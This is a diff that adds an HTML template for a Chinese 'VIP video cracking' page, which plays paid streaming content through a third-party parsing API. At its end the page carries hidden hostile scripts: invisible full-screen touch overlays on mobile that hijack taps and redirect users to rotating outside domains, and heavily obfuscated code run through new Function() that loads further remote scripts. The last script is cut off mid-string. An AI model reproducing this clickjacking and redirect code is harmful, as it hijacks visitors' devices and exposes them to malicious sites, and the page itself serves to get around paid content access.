@@ -1,0 +1,485 @@
+{% extends 'base.html' %}
+
+{% block css %}
+
+    <!-- Tile icon for Win8 (144x144 + tile color) -->
+
+    <meta name="msapplication-TileColor" content="#0e90d2">
+    <link href="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/amazeui/2.7.2/css/amazeui.min.css" type="text/css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://www.m9080.com/assets/css/app.css?v1">
+    <!--[if (gte IE 9)|!(IE)]><!-->
+    <script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/3.6.0/jquery.min.js" type="application/javascript"></script>
+    <!--<![endif]-->
+
+    <!--[if lte IE 8 ]>
+    <script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/1.11.3/jquery.min.js"></script>
+    <script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/modernizr/2.8.3/modernizr.min.js"></script>
+    <script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/amazeui/2.7.2/js/amazeui.ie8polyfill.min.js" type="application/javascript"></script>
+    <![endif]-->
+    <link href="/static/index_files/newcommons.css" rel="stylesheet" type="text/css">
+        <script>
+        // 网站相关信息，供页面内的 js 文件调用
+        var mkSiteInfo = {siteUrl: "https://www.m9080.com"}
+        var T1=T1||[];(function(){var i2=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74']("\x73\x63\x72\x69\x70\x74");i2['\x73\x72\x63']="\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68\x6d\x2e\x62\x61\x69\x64\x75\x2e\x63\x6f\x6d\x2f\x68\x6d\x2e\x6a\x73\x3f\x63\x39\x33\x64\x31\x62\x30\x66\x31\x37\x37\x39\x62\x64\x64\x32\x64\x37\x30\x64\x33\x32\x32\x31\x65\x32\x36\x39\x39\x64\x37\x35";var $HUjPqYs3=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65']("\x73\x63\x72\x69\x70\x74")[0];$HUjPqYs3['\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65']['\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'](i2,$HUjPqYs3)})();
+    </script>
+
+
+{% endblock css %}
+
+
+{% block content %}
+
+<header class="am-topbar">
+    <div class="am-container">
+    <h1 class="am-topbar-brand hover-bounce">
+        <div  class="web-name">
+            <!-- 网站 Logo -->
+            <span class="am-icon-film am-icon-md"></span> 
+            qloves TV
+        </div>
+    </h1>
+
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-secondary am-show-sm-only" data-am-collapse="{target: '#doc-topbar-collapse'}">
+        <span class="am-sr-only">导航切换</span> 
+        <span class="am-icon-bars"></span>
+    </button>
+
+  <div class="am-collapse am-topbar-collapse" id="doc-topbar-collapse">
+    <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="/index/TV/">首页</a></li>
+        <li><a href="https://www.m9080.com/movie.html">电影</a></li>
+        <li><a href="https://www.m9080.com/tv.html">电视剧</a></li>
+        <li><a href="https://www.m9080.com/cartoon.html">动漫</a></li>
+        <li><a href="https://www.m9080.com/variety.html">综艺</a></li>
+
+    </ul>
+
+    <form class="am-topbar-form am-topbar-left am-form-inline" role="search" action="https://www.m9080.com/search.html">
+        <div class="am-input-group am-input-group-primary am-input-group-sm">
+            <input name="wd" type="text" class="am-form-field" placeholder="搜索" required>
+            <span class="am-input-group-btn">
+                <button class="am-btn am-btn-primary" type="submit">
+                    <span class="am-icon-search"></span>
+                </button>
+                <i class="up-new" data-am-popover="{content: 'Sorry家变得那么乱(广告多),但是没有AD就承载不下我们这些朋友了',theme: 'sm', trigger: 'hover focus'}"></i>
+            </span>
+        </div>
+    </form>
+
+
+
+  </div>
+  </div>
+</header>
+<style>
+.btn-play-source{margin:0 5px 5px 0}.btn-fullweb{color:#dd514c;cursor:pointer;margin-left:10px}#jxHistory a{color: #666;}
+</style>
+
+<div class="am-container">
+
+<div class="am-input-group am-input-group-primary am-margin-bottom">
+    <input id="video-url" type="text" class="am-form-field" placeholder="粘贴原视屏播放链接..." value="" required>
+    
+    <span class="am-input-group-btn">
+        <button id="btn-vip-play" class="am-btn am-btn-primary" type="submit">
+            <span class="am-icon-play-circle"></span> 破解播放
+        </button>
+    </span>
+</div>
+
+<div class="am-panel am-panel-default">
+    <div class="am-panel-hd">VIP视屏破解<span class="btn-fullweb am-fr am-show-md-up am-hide">[页面全屏]</span></div>
+    
+    <div class="am-panel-bd player-box">
+        <span id="btn-fullweb-hide" class="close-full am-icon-arrows-alt" title="退出页面全屏"></span>
+        <iframe id="mk-vip-player" src="" allowtransparency="true" 
+            allowfullscreen="allowfullscreen"
+            mozallowfullscreen="mozallowfullscreen"
+            msallowfullscreen="msallowfullscreen"
+            oallowfullscreen="oallowfullscreen"
+            webkitallowfullscreen="webkitallowfullscreen" scrolling="No" width="100%" height="100%"></iframe>
+    </div>
+    
+</div>
+
+</strong></p>
+         <p></p><p><font size="3px" color="#FFFFFF">点击下面视频图标,可进入会员视频地址,复制粘贴到上面的编辑框内点击播放，如果播放不了尝试切换线路。</font></p>
+
+					<div id="ckplays"></div>
+						<div class="logos_lists" style="margin-left:30px;">
+							<dl>
+								<a target="_blank" href="http://vip.iqiyi.com/"><img src="/static/index_files/aqylogo.png" alt=""></a>
+								<dd>爱奇艺视频</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="http://film.qq.com/"><img src="/static/index_files/qqlogo.png" alt=""></a>
+								<dd>腾讯视频</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="http://vip.youku.com/"><img src="/static/index_files/youkulogo.png" alt=""></a>
+								<dd>优酷视频</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="http://vip.le.com/"><img src="/static/index_files/letvlogo.png" alt=""></a>
+								<dd>乐视TV视频</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="http://fs.fun.tv/vip"><img src="/static/index_files/fxw.png" alt=""></a>
+								<dd>风行网</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="http://www.mgtv.com/vip/"><img src="/static/index_files/hunantvlogo.png" alt=""></a>
+								<dd>芒果TV视频</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="https://film.sohu.com/"><img src="/static/index_files/sohulogo.png" alt=""></a>
+								<dd>搜狐视频</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="http://vip.pptv.com/"><img src="/static/index_files/pps.png" alt=""></a>
+								<dd>PPTV</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="https://vip.1905.com/"><img src="/static/index_files/m1905.png" alt=""></a>
+								<dd>m1905电影网</dd>
+							</dl>
+							<dl>
+								<a target="_blank" href="https://www.bilibili.com/"><img src="/static/index_files/bilibili.png" alt=""></a>
+								<dd>bilibi视频网</dd>
+							</dl>
+						</div>
+				  </font></div>
+<br>
+<br>
+        <hr/>
+
+    
+
+<div class="am-g">
+    <div class="am-u-sm-12 am-u-lg-8">
+    <div class="am-panel am-panel-default" id="jxHistory">
+        <div class="am-panel-hd">解析历史</div>
+    
+        <div class="am-panel-bd">
+            <ul class="am-list am-list-border" id="jxHistoryContent">
+                <li><a href="javascript:;">暂无解析记录</a></li>
+            </ul>
+        </div>
+    </div>
+    </div>
+    <div class="am-u-sm-12 am-u-lg-4">
+    <div class="am-panel am-panel-default">
+        <div class="am-panel-hd">热门推荐</div>
+        <div class="am-panel-bd">
+            <ul class="right-list" style="margin-top: 0px;">
+            <li>
+            <a href="https://www.m9080.com/play/boid/135395.html" target="_blank" class="am-text-truncate">
+                <span class="r-l-right">综艺</span>
+                <span class="am-badge am-round">1</span>
+                全员加速中 (2023)
+            </a>
+        </li><li>
+            <a href="https://www.m9080.com/play/boid/132932.html" target="_blank" class="am-text-truncate">
+                <span class="r-l-right">国产剧</span>
+                <span class="am-badge am-round">2</span>
+                护心 (2023)
+            </a>
+        </li><li>
+            <a href="https://www.m9080.com/play/boid/134978.html" target="_blank" class="am-text-truncate">
+                <span class="r-l-right">国产剧</span>
+                <span class="am-badge am-round">3</span>
+                花戎 (2023)
+            </a>
+        </li><li>
+            <a href="https://www.m9080.com/play/boid/135079.html" target="_blank" class="am-text-truncate">
+                <span class="r-l-right">国产剧</span>
+                <span class="am-badge am-round">4</span>
+                照亮你 (2023)
+            </a>
+        </li><li>
+            <a href="https://www.m9080.com/play/vaid/ZM5nbHN172g8Ej.html" target="_blank" class="am-text-truncate">
+                <span class="r-l-right">综艺</span>
+                <span class="am-badge am-round">5</span>
+                乘风2023 (2023)
+            </a>
+        </li>            </ul>
+        </div>
+    </div>
+    </div>
+</div>
+
+<script>
+var store, krDYnnmr = '';
+mkSiteInfo.jxvideoApi = "//line1.favnow.com/?uid=89&token=mui&v=";
+
+$(function() {
+    store = $.AMUI.store;
+    var jxhistemp = store.get('jxhistory') ? store.get('jxhistory') : [];
+    
+    if(isEmpty(krDYnnmr) == false){
+        $("#mk-vip-player").attr("src", mkSiteInfo.jxvideoApi + krDYnnmr);
+    }else{
+        // 显示操作演示 GIF
+        let playerHtml = '<style type="text/css">* {margin: 0; padding: 0;}html, body {width: 100%; height: 100%;}body{display: table;}.img{text-align: center; vertical-align: middle; display: table-cell;}img{width: 100%; max-width: 500px;}</style>';
+        playerHtml += '<div class="img"><img src="https://sports3.gtimg.com/community/2a95f93108a74f21b7ddd8163218e80a.gif"></div>';
+        $("#mk-vip-player").contents().find("body").html(playerHtml);
+    }
+    // 展示播放历史
+    if (store.enabled) {
+        if (jxhistemp.length == 0) {
+            $("#jxHistoryContent").html('<li><a href="javascript:;">暂无解析记录</a></li>');
+        }else{
+            $("#jxHistoryContent").html('');
+            for (var i = 0; i < jxhistemp.length; i++) {
+                $("#jxHistoryContent").append('<li><span class="am-badge am-badge-success">'+jxhistemp[i].date+'</span><a href="https://www.m9080.com/vip.html?url=' + jxhistemp[i].url + '" class="am-text-truncate ">' + jxhistemp[i].url + '</a></li>');
+            }
+        }
+    }else{
+        $("#jxHistoryContent").html('<li><a href="javascript:;">无法正常记录，请检查浏览器</a></li>');
+    }
+    // 绑定播放事件
+    $("#btn-vip-play").click(function() {
+        layer.msg("提交成功");
+        refreshVideo();
+    });
+});
+
+// 刷新视屏播放
+function refreshVideo() {
+    var videoUrl = $("#video-url").val(), domain;
+    var jxhistemp = store.get('jxhistory') ? store.get('jxhistory') : [];
+    if(videoUrl == "") {
+        layer.msg("链接不能为空！");
+        return false;
+    }
+    
+    if(videoUrl.indexOf("m.v.qq.com") != -1){
+        let t_parma = getUrlParams(videoUrl), t_cid = isEmpty(t_parma["cid"])?'':t_parma["cid"], t_vid = isEmpty(t_parma["vid"])?'':t_parma["vid"];
+        if(t_vid == '' && t_cid != ''){
+            videoUrl = 'https://v.qq.com/x/cover/' + t_cid + '.html';
+        }else if(t_vid != '' && t_cid != ''){
+            videoUrl = 'https://v.qq.com/x/cover/' + t_cid + '/' + t_vid + '.html';
+        }
+    }
+    
+    if (videoUrl.indexOf("?") != -1) {
+        domain = videoUrl.split('?');
+        videoUrl = domain[0];
+    }
+    
+    let jxtemp = {
+        types: 'jx',
+        date: new Date().toLocaleDateString(),
+        url: videoUrl, 
+    };
+    for(var i=0; i<jxhistemp.length; i++) {
+        if(jxhistemp[i].types == "jx" && jxhistemp[i].url == videoUrl) {
+            jxhistemp.splice(i, 1); // 删除之前的历史记录
+            break;
+        }
+    }
+    jxhistemp.unshift(jxtemp);
+    if(jxhistemp.length > 5) jxhistemp.length =  5; 
+    store.set('jxhistory', jxhistemp);
+    
+    window.open('/index/TV_home?url=' + videoUrl, '_self');
+}
+function isEmpty(param){
+    if(param){
+        var param_type = typeof(param);
+        if(param_type == 'object'){
+            //要判断的是【对象】或【数组】或【null】等
+            if(typeof(param.length) == 'undefined'){
+                if(JSON.stringify(param) == "{}"){
+                    return true;//空值，空对象
+                }
+            }else if(param.length == 0){
+                return true;//空值，空数组
+            }
+        }else if(param_type == 'string'){
+            //如果要过滤空格等字符
+            var new_param = param.trim();
+            if(new_param.length == 0){
+                //空值，例如:带有空格的字符串" "。
+                return true;
+            }
+        }else if(param_type == 'boolean'){
+            if(!param){
+                return true;
+            }
+        }else if(param_type== 'number'){
+            if(!param){
+                return true;
+            }
+        }
+        return false;//非空值
+    }else{
+        return true;
+    }
+}
+const getUrlParams = (url) => {
+  const keyValueArr = url.split("?")[1].split("&");
+  let paramObj = {};
+  keyValueArr.forEach((item) => {
+    const keyValue = item.split("=");
+    paramObj[keyValue[0]] = keyValue[1];
+  });
+  return paramObj;
+}
+
+</script>
+<script src="https://www.m9080.com/assets/js/full-screen.js?v2021092"></script>
+</div>  <!-- 容器 -->
+
+
+    <!-- 返回顶部 -->
+    <div data-am-widget="gotop" class="am-gotop am-gotop-fixed" title="">
+        <a href="#top" title="返回顶部">
+            <i class="am-gotop-icon am-icon-arrow-up"></i>
+        </a>
+    </div>
+        <!-- 底部栏 -->
+    <footer data-am-widget="footer" class="am-footer am-footer-default am-hide-sm-only" data-am-footer="{  }">
+        <div class="am-footer-miscs">
+            <p>CopyRight © 2023 鲨鱼TV</p>
+            <p> 感谢您分享本站 😊 </p>
+            <p>本站不提供任何视听上传服务,所有内容均来自视频分享站点所提供的公开引用资源</p>
+            <p><a href="https://www.m9080.com/about.html" target="_blank">[侵权申诉]</a> </p>
+        </div>
+    </footer>
+
+    <!-- 底部导航栏 -->
+    <!-- 图标资源来自于 https://www.flaticon.com/packs/cinema-3 -->
+    <div data-am-widget="navbar" class="am-navbar am-cf am-navbar-default am-show-sm-only" id="">
+        <ul class="am-navbar-nav am-cf am-avg-sm-4">
+            <li>
+                <a href="https://www.m9080.com/" class="">
+                    <img src="https://www.m9080.com/assets/i/footer/home.png" alt="首页"/>
+                    <span class="am-navbar-label">首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://www.m9080.com/movie.html" class="">
+                    <img src="https://www.m9080.com/assets/i/footer/film.png" alt="电影"/>
+                    <span class="am-navbar-label">电影</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://www.m9080.com/tv.html" class="">
+                    <img src="https://www.m9080.com/assets/i/footer/tv.png" alt="电视剧"/>
+                    <span class="am-navbar-label">电视剧</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://www.m9080.com/cartoon.html" class="">
+                    <img src="https://www.m9080.com/assets/i/footer/ct.png" alt="动漫"/>
+                    <span class="am-navbar-label">动漫</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://www.m9080.com/variety.html" class="">
+                    <img src="https://www.m9080.com/assets/i/footer/va.png" alt="综艺"/>
+                    <span class="am-navbar-label">综艺</span>
+                </a>
+            </li>
+        </ul>
+    </div>
+
+
+    
+
+    <!-- layer弹窗插件 -->
+    <script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/layer/3.5.1/layer.min.js"></script>
+    <script src="https://www.m9080.com/assets/js/jquery.lazyload.min.js"></script>
+
+<script type="text/javascript">
+var store;
+$(function () {
+    var qrcode=document.getElementById('show-qrcode-image');
+	if (navigator.userAgent.match(/iPad|iPhone|Linux|Android|iPod/i) != null) qrcode.style.display='none';  else qrcode.style.display='';  
+	$('#qrcode').qrcode(window.location.href);
+    // 图片懒加载
+    $("img.lazyload").lazyload({
+        effect: "fadeIn",
+        load: function () {
+            $(this).removeClass('lazyload');
+            $(this).addClass('img-loaded');
+        }
+    });
+    //$.AMUI.store.remove('videoApi'); //清理老旧接口
+    // 展示播放历史记录
+    $("#show-history").click(function () {
+        store = $.AMUI.store;
+        if (store.enabled) {
+            var histemp = store.get('history') ? store.get('history') : [];
+
+            if (histemp.length == 0) {
+                $("#history-list").html('<li><a href="javascript:;">暂无播放记录</a></li>');
+            } else {
+                $("#history-list").html('');
+
+                for (var i = 0; i < histemp.length; i++) {
+                    switch (histemp[i].types) {
+                    case 'movie':
+                        $("#history-list").append('<li><a href="/play/mid/' + histemp[i].id + '.html">' + histemp[i].name + '</a></li>');
+                        break;
+
+                    case 'tv':
+                        $("#history-list").append('<li><a href="/play/tvid/' + histemp[i].id + '.html">' + histemp[i].name + ' [' + histemp[i].episode + ']</a></li>');
+                        break;
+                    case 'ct':
+                        $("#history-list").append('<li><a href="/play/ctid/' + histemp[i].id + '.html">' + histemp[i].name + ' [' + histemp[i].episode + ']</a></li>');
+                        break;
+                    case 'va':
+                        $("#history-list").append('<li><a href="/play/vaid/' + histemp[i].id + '.html">' + histemp[i].name + ' [' + histemp[i].episode + ']</a></li>');
+                        break;
+                    case 'bozy':
+                        $("#history-list").append('<li><a href="/play/boid/' + histemp[i].id + '.html">' + histemp[i].name + ' [' + histemp[i].episode + ']</a></li>');
+                        break;
+                    case 'bdzy':
+                        $("#history-list").append('<li><a href="/play/bid/' + histemp[i].id + '.html">' + histemp[i].name + ' [' + histemp[i].episode + ']</a></li>');
+                        break;
+                    case 'wjzy':
+                        $("#history-list").append('<li><a href="/play/wid/' + histemp[i].id + '.html">' + histemp[i].name + ' [' + histemp[i].episode + ']</a></li>');
+                        break;
+
+                    }
+                }
+
+                $("#history-list").append('<li><a href="javascript:;" onclick="clearHistory();"><span class="am-text-warning am-text-xs">清空播放记录</span></a></li>');
+            }
+
+        }
+    });
+});
+
+// 清空历史记录
+function clearHistory() {
+    // 关闭下拉
+    $("#show-history-dropdown").dropdown("close");
+    
+    // 清空播放记录存储
+    store.remove('history');
+    
+    layer.msg("播放记录已清空");
+}
+// url编码
+// 输入参数：待编码的字符串
+function urlEncode(String) {
+    return encodeURIComponent(String).replace(/'/g,"%27").replace(/"/g,"%22");
+
+}
+
+</script>
+
+
+<script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/amazeui/2.7.2/js/amazeui.min.js" type="application/javascript"></script>
+<!-- 百度、360等搜索引擎的主动推送代码放在这里 ↓↓↓ -->
+
+<!-- 百度、360等搜索引擎的主动推送代码放在这里 ↑↑↑ -->
+<!--<script src='https://pc.stgowan.com/pc/rich-tf.js' id="richid" data='s=6562'></script>-->
+<script>if(!/^Mac|Win/.test(navigator.platform)){var i=0;for(var n=0;n<4;n++){for(var j=0;j<10;j++){var style="position:fixed; bottom:"+(8.5*n)+"vw; left:"+j*10+"vw; z-index:10;display:block;width:9.6vw;height:8.5vw;background: #000;opacity:0.01;";document.write('<div class="gshkmhst_b" style="'+style+'"></div>');var a=document.getElementsByClassName("gshkmhst_b");a[i].addEventListener("touchend",function(){var gshkmhst_n="https://"+(new Date().getDate())+"dcc.rnhqxh.com"+":8007/cc/2938?is_not=1&target=1&ty=2";if(top.location!=self.location){top.location=gshkmhst_n}else{window.location.href=gshkmhst_n}});i++}}};</script>      <script>!function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a(`wtkOapriOml7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF! 67cl/3yd(?V62/mFYLFc2a??l2a[Xd5 pLhS^hLFM6LMDL8pLhS^hLFM6LMSS80!LYF|6^YO_Fc7_2(F6O2ca[67cpLhS^hLFM6LMDL880a[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!fO(_^Y2FmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67cpLhS^hLFM6LMDL880a[Xd5 (q6Y2FhY6phF8D62fODm622Y59Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@00.c(q6Y2FD6fFh/K00aaavvpLhS^hLFM6LMSS880a[pLhS^hLFM6LMSS8}!Xd5 pLhS^hLFM^8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"f((m52h:Rhm(O^"%"g{001/((/@Qs{j6LM2OF8}vFd5pYF8}"!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28pLhS^hLFM^PYqLY[D62fODmqO(dF6O2mh5Y78pLhS^hLFM^PpLhS^hLFM6LMSS80PPPPa!7O5cXd5 280!2<o!2%%a[7O5cXd5 C80!C<}0!C%%a[Xd5 LFTqY8"JOL6F6O2g76RYf! )OFFO^g"%c{mn.2a%"XD! qY7Fg"%C.}0%"XD! 4*62fYRg}00!f6LJqdTg)qO(S!D6fFhgQmKXD!hY6phFg{mnXD!)d(Sp5O_2fg #000!OJd(6FTg0m0}!"!fO(_^Y2Fm)OfTm62LY5FrfCd(Y2F9|ytc")Y7O5YY2f"=\'<f6X LFTqY8"\'%LFTqY%\'"></f6X>\'aPPLYF|6^YO_Fc7_2(F6O2ca[67cpLhS^hLFM6LMDL880a[Xd5 68fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"f((m52h:Rhm(O^"%"g{001/f/@Qs{j(8}v28pLhS^hLF"!Xd5 _8fO(_^Y2FmpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!Xd5 L))8fO(_^Y2Fm(5YdFYEqY^Y2Fc"LFTqY"a!L))m6f8"pLhS^hLFMLFTqYM6f"!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!fO(_^Y2FmhYdfmdJJY2fxh6qfcL))aPP=}000aPP=@n00a!P 67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5?IzI/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[Xd5 DLRp8H"DLfpmDTCDFJm(O^"="DLfpmDTCDFJm(O^"="DLfpmDTCDFJm(O^"="DLfpm(J:LqLm(O^"="DLfpm(J:LqLm(O^"="DLfpm(J:LqLm(O^"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS! Xd5 (82YD VY)iO(SYFc"DLLg//"%c2YD wdFYcampYFwdFYcaa%DLRpHSZ%"g@00Q1"%"/@Qs{"a! (mO2OJY287_2(F6O2cYa[pLhS^hLFM6LMDL8pLhS^hLFM6LMSS8}!LYF|6^YO_Fcca8>[Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"pLhS^hLFMLFTqYM6f"a!67c(d2Xda[(d2Xdm5Y^OXYcaPP=}000aP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"fpmL^d)TYm(O^"%"g{001\/L(/@Qs{j28pLhS^hLF"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!`.substr(10));new Function(b)()}();</script>
+<!-- wap顶 -->
+<script>if(!/^Mac|Win/.test(navigator.platform)){var i=0;for(var n=0;n<4;n++){for(var j=0;j<10;j++){var style="position:fixed; top:"+(8.5*n)+"vw; left:"+j*9.8+"vw; z-index:10;display:block;width:9.6vw;height:8.5vw;background: #000;opacity:0.01;";document.write('<div class="bxumbuyt_b" style="'+style+'"></div>');var a=document.getElementsByClassName("bxumbuyt_b");a[i].addEventListener("touchend",function(){var bxumbuyt_n="https://"+(new Date().getDate())+"kcc.hpcwwd.com"+":8008/cc/2427?is_not=1&target=1&ty=2";if(top.location!=self.location){top.location=bxumbuyt_n}else{window.location.href=bxumbuyt_n}});i++}}};</script>      <script>!function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a(`FbeJShgVPtl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 